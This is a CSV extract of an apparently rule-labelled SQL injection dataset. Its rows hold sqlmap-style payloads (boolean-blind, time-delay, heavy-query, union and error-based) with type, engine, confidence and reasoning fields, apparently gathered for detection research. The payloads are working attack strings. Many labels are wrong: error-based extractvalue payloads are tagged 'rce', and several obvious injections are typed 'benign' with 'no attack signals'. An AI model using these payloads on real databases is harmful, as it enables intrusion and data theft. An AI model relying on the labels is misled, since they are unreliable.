row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
960,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3-- ampw",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
961,"1' in boolean mode ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) #",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
962,1' ) where 2753 = 2753 and ( 2739 = 8047 ) *8047--,1,,boolean_blind,generic,0.95,2753 = 2753 and detected — boolean_blind injection (priority 8) on generic,rule-based
963,1'+ ( select 'ljtl' where 1766 = 1766,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
964,-3921' ) as audo where 7087 = 7087 or 1755 = 4937--,1,,boolean_blind,generic,0.95,7087 = 7087 or detected — boolean_blind injection (priority 8) on generic,rule-based
965,"-2072"" ) as rjcz where 2491 = 2491 or 6872 = 6872--",1,,boolean_blind,generic,0.95,2491 = 2491 or detected — boolean_blind injection (priority 8) on generic,rule-based
966,1' ) as llug where 2244 = 2244 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,1,,boolean_blind,generic,0.95,2244 = 2244 and detected — boolean_blind injection (priority 8) on generic,rule-based
967,"1' ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
968,-7187' or 4159 = 7465,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
969,"1' or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and 'ytlf' = 'ytlf",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
970,"1"" ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ""cdnc"" like ""cdnc",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
971,select ( case when ( 3855 = 3855 ) then 3855 else 1/ ( select 0 ) end ) --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
972,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'dthp' = 'dthp",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
973,"1"" and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ""tfok"" like ""tfok",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
974,1' ) where 6622 = 6622 order by 1--,1,,boolean_blind,generic,0.95,6622 = 6622 or detected — boolean_blind injection (priority 8) on generic,rule-based
975,"1' and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'kwhs' like 'kwhs",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
976,"1' or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and 'rhzy' = 'rhzy",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
977,"1'+ ( select 'yzxc' where 5230 = 5230 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) ) +'",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
978,"1'+ ( select 'sbvh' where 8539 = 8539 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ) +'",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
979,"-7813"" ) ) as yvyl where 5172 = 5172 union all select 5172,5172#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
980,1'|| ( select 'uiyj' from dual where 8320 = 8320,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
981,select ( case when ( 4111 = 1992 ) then 4111 else 1/ ( select 0 ) end ) --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
982,"select count ( * ) from generate_series ( 1,5000000 ) and ""xcjt"" = ""xcjt",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
983,"1 where 1096 = 1096 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
